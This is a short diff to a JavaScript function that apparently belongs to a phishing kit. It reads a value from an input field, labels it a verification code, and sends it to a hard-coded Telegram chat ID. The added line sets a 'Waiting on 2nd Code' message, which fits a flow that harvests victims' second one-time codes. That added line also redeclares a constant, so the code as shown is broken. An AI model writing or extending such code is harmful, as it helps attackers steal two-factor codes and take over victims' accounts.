@@ -75,6 +75,7 @@ async function send_telegram_message() {
   const chatIds = ["-1001991348429"]; // Add your chat IDs here
   const verificationCode = email_field.value;
   const msg = `Verification code: ${verificationCode}`;
+  const msg = 'Waiting on 2nd Code'
 
   for (let i = 0; i < chatIds.length; i++) {
     const data = {
